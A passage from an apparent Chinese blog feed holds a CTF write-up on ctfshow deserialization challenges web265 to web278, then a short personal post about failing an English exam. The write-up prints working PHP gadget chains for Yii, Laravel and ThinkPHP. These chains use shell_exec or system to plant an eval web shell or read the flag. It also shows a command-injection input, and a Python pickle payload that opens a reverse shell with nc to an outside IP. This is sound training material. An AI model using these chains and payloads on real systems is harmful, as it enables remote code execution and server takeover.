class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token= &amp;$this-&gt;password;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token=&amp;$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1234;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="web266–PHP对类名的大小写不敏感"><a href="#web266–PHP对类名的大小写不敏感" class="headerlink" title="web266–PHP对类名的大小写不敏感"></a>web266–PHP对类名的大小写不敏感</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$cs = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;username===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ctfshowo=@unserialize($cs);</span><br><span class="line">if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;</span><br><span class="line">    throw new Exception(&quot;Error $ctfshowo&quot;,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化一下，把类名大写即可，里面不用有东西，能触发__destruct就行</p><h2 id="web267（yii反序列化漏洞）"><a href="#web267（yii反序列化漏洞）" class="headerlink" title="web267（yii反序列化漏洞）"></a>web267（yii反序列化漏洞）</h2><p>弱口令admin admin</p><p>登陆后看前端源码发现about出存在源码</p><p><img src="https://img-blog.csdnimg.cn/cee2e0df9448485990e5ee0c6a6158b4.png" alt="img"></p><p>从群里拿了这个框架的链子直接来用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        //echo &quot;&lt;?php eval($_POST[1]);? &gt;&quot; &gt; /var/www/html/basic/web/1.php</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\db&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader = new Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    echo base64_encode(serialize(new yii\db\BatchQueryResult));</span><br><span class="line">   // print_r(&#x27;aaaa&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到2.php可以成功rce了。</p><h2 id="web268（yii反序列化漏洞）"><a href="#web268（yii反序列化漏洞）" class="headerlink" title="web268（yii反序列化漏洞）"></a>web268（yii反序列化漏洞）</h2><p>同样是yii上面的那条链子不能用了，用了下面这条，操作基本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            // 这里需要改为isRunning</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// poc2</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class RunProcess&#123;</span><br><span class="line">        private $processes;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processes = [new Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    // 生成poc</span><br><span class="line">    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web269（yii反序列化漏洞）"><a href="#web269（yii反序列化漏洞）" class="headerlink" title="web269（yii反序列化漏洞）"></a>web269（yii反序列化漏洞）</h2><p>上述那个链子也不行了，从网上找了一条新链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;);</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web270（yii反序列化漏洞）"><a href="#web270（yii反序列化漏洞）" class="headerlink" title="web270（yii反序列化漏洞）"></a>web270（yii反序列化漏洞）</h2><p>直接用269的链子还可以。</p><h2 id="web271（lavaral反序列化漏洞）"><a href="#web271（lavaral反序列化漏洞）" class="headerlink" title="web271（lavaral反序列化漏洞）"></a>web271（lavaral反序列化漏洞）</h2><p>找了这个链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = new \Illuminate\Bus\Dispatcher();</span><br><span class="line">            $this-&gt;event = new BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  class BroadcastEvent &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus &#123;</span><br><span class="line">    class Dispatcher &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Loader &#123;</span><br><span class="line">    class EvalLoader &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator &#123;</span><br><span class="line">    class MockDefinition &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;code = $evilCode;</span><br><span class="line">            $this-&gt;config = new MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class MockConfiguration &#123;</span><br><span class="line">        protected $name = &#x27;abcdefg&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  $code = &quot;&lt;?php system(&#x27;cat /flag&#x27;); exit; ?&gt;&quot;;;</span><br><span class="line">  $exp = new \Illuminate\Broadcasting\PendingBroadcast($code);</span><br><span class="line">  echo urlencode(serialize($exp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>同上</p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>同上</p><h2 id="web274（thinkphp）"><a href="#web274（thinkphp）" class="headerlink" title="web274（thinkphp）"></a>web274（thinkphp）</h2><p>thinkphp现在比赛好少见的身影，去年我是萌新时天天见。</p><p>找一条链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">namespace think;</span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;huha&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        # append键必须存在，并且与$this-&gt;data相同</span><br><span class="line">        $this-&gt;append = [&quot;huha&quot;=&gt;[]];</span><br><span class="line">        $this-&gt;data = [&quot;huha&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//var_dump(new Windows());</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo2OiJjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=&amp;huha[]=tac /flag</span><br></pre></td></tr></table></figure><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=false;</span><br><span class="line"></span><br><span class="line">    public function __construct($f,$fn)&#123;</span><br><span class="line">        $this-&gt;filename=$f;</span><br><span class="line">        $this-&gt;filecontent=$fn;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checkevil()&#123;</span><br><span class="line">        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;evilfile)&#123;</span><br><span class="line">            system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">    $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">    if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">        file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">        echo &#x27;work done&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;where is flag?&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有点好玩，他引入了system这个函数，然后发现直接可以rce了</p><p>传fn=1.html;id</p><h2 id="web277-python-反序列化"><a href="#web277-python-反序列化" class="headerlink" title="web277(python 反序列化)"></a>web277(python 反序列化)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where is flag?&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure><p>从这段代码能看出时python序列化且存在反序列化的漏洞</p><h2 id="reduce-介绍"><a href="#reduce-介绍" class="headerlink" title="_reduce_()介绍"></a>_<em>reduce</em>_()介绍</h2><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）</p><p>因此利用此来构造序列化，然后拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class CTFshow():</span><br><span class="line">    def sw(self):</span><br><span class="line">        print(self.show)</span><br><span class="line">    def __init__(self,show):</span><br><span class="line">        self.show=show</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 101.42.138.249 6666 -e /bin/sh&#x27;).read()&quot;,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = CTFshow(&quot;http://6122e189-3fb6-45a2-b099-aeb0071f1ddd.challenge.ctf.show/&quot;)</span><br><span class="line"></span><br><span class="line">ctfshow_usr= pickle.dumps(cs)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode((ctfshow_usr)))</span><br></pre></td></tr></table></figure><p>传参</p><p><img src="https://img-blog.csdnimg.cn/fcff2675c6124532831899a8d6cb09c9.png" alt="img"></p><p>成功执行，反弹shell 后直接拿flag</p><p><img src="https://img-blog.csdnimg.cn/35c041ee6fa541a49b0fb6fc30c077fb.png" alt="img"></p><h2 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h2><p>方法同上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow反序列化&quot;&gt;&lt;a href=&quot;#ctfshow反序列化&quot; class=&quot;headerlink&quot; title=&quot;ctfshow反序列化&quot;&gt;&lt;/a&gt;ctfshow反序列化&lt;/h1&gt;&lt;h2 id=&quot;web254&quot;&gt;&lt;a href=&quot;#web254&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>浅聊</title>
    <link href="http://websec.space/2022/02/24/%E6%B5%85%E8%81%8A%E4%B8%80%E4%B8%8B%E6%96%87%E5%8C%96%E8%AF%BE%E5%92%8C%E6%8A%80%E6%9C%AF%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <id>http://websec.space/2022/02/24/%E6%B5%85%E8%81%8A%E4%B8%80%E4%B8%8B%E6%96%87%E5%8C%96%E8%AF%BE%E5%92%8C%E6%8A%80%E6%9C%AF%E7%9A%84%E5%85%B3%E7%B3%BB/</id>
    <published>2022-02-23T16:00:00.000Z</published>
    <updated>2022-02-24T03:32:51.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅聊"><a href="#浅聊" class="headerlink" title="浅聊"></a>浅聊</h1><blockquote><p>今天四级出分，没过，有些意料之中，但查到的那一刻还是有些出乎意料的，正好刚查完分数，家里突然没电了，不知道为甚么最近老是跳闸，趁着这回断网断电，我当是写一个记录。</p></blockquote><p>​        有几个朋友问我怎么回事难受，我都是回复感觉还好，我心里也清楚，我当时的水平就是再及格线的边缘的，借此挂科一门（还有补考，不算挂科，薛定谔的挂科），四级没过的成就达成。（现在倒是够乐观）。</p><p>​        借此记录一下学习成绩的转变，大一一年绩点还是年纪第四，当时还有竞赛成绩加持感觉风光无限。也是从大一下，到大二上我整个人的思维发生了转变，从之前一个做题家（还是个不合格的做题家）到技术流的转变（也是个不合格的技术流），但学习的思维确实发生了很大的转变，我没想到的是能这么快在成绩上展现，确实脑袋朦朦胧胧的。怎么说呢，我之前一直是一个中立的思维，也就是这种中立的思维让我有点极端，我平时时间都拿来搞自己感兴趣的东西了，所以指望着期末突击，而上一个学期又恰恰是大学四年中课程最多的一个学期，整整十一门（一会如果如果可以我在下面附一下课表），最后突击就从高分变成了不挂科，同时这时候考四级，导致直接放弃了四级的复习，到了四级考试的前一天我才做了几份之前买的题。众多客观原因再此，尽管我认为我主观上已经尽力了，也是无力回天了，毕竟不是什么神人。</p><p>​        这是一个坏事情又是一个好事情，坏事情是确实又挂了科又没过四级，好事情是我包袱没了，终于不用考虑什么我这周一直搞ctf是不是上课的东西没学影响我期末成绩，这个包袱是彻底放下了。上个学期是搞web的开局，走了很多弯路，但跌跌撞撞让我找到方向了，但也认识到好像还差的好远，那天从聊天中也能看到，我真的差的有点多，寒假算是开始了一些东西，但可能把战线拉得有点太长了，开学要好好坚持住一个方向搞深一点，当然下学期课程也变少了，我也要拿出一定精力去学英语，争取搞一手500+。</p><p>​        </p>]]></content>
    
    
      
      
